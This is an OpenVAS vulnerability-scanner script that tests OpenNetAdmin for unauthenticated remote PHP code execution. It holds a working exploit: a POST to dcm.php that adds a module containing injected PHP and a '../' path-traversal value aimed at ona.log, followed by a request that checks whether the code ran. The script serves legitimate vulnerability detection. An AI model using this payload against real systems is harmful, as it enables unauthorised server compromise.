###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_opennetadmin_61004.nasl 11 2013-10-27 10:12:02Z jan $
#
# OpenNetAdmin 'ona.log' File Remote PHP Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "An attacker can exploit this issue to inject and execute arbitrary PHP
code in the context of the affected application. This may facilitate a
compromise of the application and the underlying system; other attacks
are also possible.
Impact Level: Application";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103760";

tag_insight = "This problem exist because adding modules can be done without any sort
of authentication.";


tag_affected = "OpenNetAdmin 13.03.01 is vulnerable; other versions may also be
affected.";

tag_summary = "OpenNetAdmin is prone to a remote PHP code-execution vulnerability.";
tag_solution = "Ask the Vendor for an update.";
tag_vuldetect = "This NVT add a new module to execute some php code by sending some HTTP requests to the target.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(61004);
 script_tag(name:"cvss_base", value:"9.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");
 script_version ("$Revision: 11 $");

 script_name("OpenNetAdmin 'ona.log' File Remote PHP Code Execution Vulnerability");

 desc = "
Summary:
" + tag_summary + "

Vulnerability Detection:
" + tag_vuldetect + "

Vulnerability Insight:
" + tag_insight + "

Impact:
" + tag_impact + "

Affected Software/OS:
" + tag_affected + "

Solution:
" + tag_solution;

 script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61004");
 
 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-08-13 15:18:42 +0200 (Tue, 13 Aug 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to execute php code");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "affected" , value : tag_affected);
  }

 exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

foreach dir (make_list("/ona", cgi_dirs())) {

  req = http_get(item:dir + '/', port:port);
  buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

  if("<title>OpenNetAdmin ::" >< buf) {
    install = dir;
    break;
  }

}

if(!install)exit(0);

check = 'openvas_test_' + rand() + '_' + unixtime();
mod_name = 'openvas_' + rand() + '_' + unixtime();

ex = 'options%5Bdesc%5D=%3C%3Fphp+echo+%27' + check  + '%27+%3F%3E&module=add_module&options%5Bname%5D=' + mod_name + '&options%5Bfile%5D=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fona.log';

req = 'POST ' + dir + '/dcm.php HTTP/1.1\r\n' + 
      'Host: ' + host + '\r\n' + 
      'Connection: close\r\n' + 
      'Content-Type: application/x-www-form-urlencoded\r\n' + 
      'Content-Length: ' + strlen(ex) + '\r\n' + 
      '\r\n' + ex;

result = http_send_recv(port:port, data:req, bodyonly:FALSE); 

if("Module ADDED" >!< result || check >!< result)exit(99);

url = dir + '/dcm.php?module=' + mod_name;
req = http_get(item:url, port:port);
buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

if(check >< buf) {

  security_hole(port:port);
  exit(0);

}

exit(99);
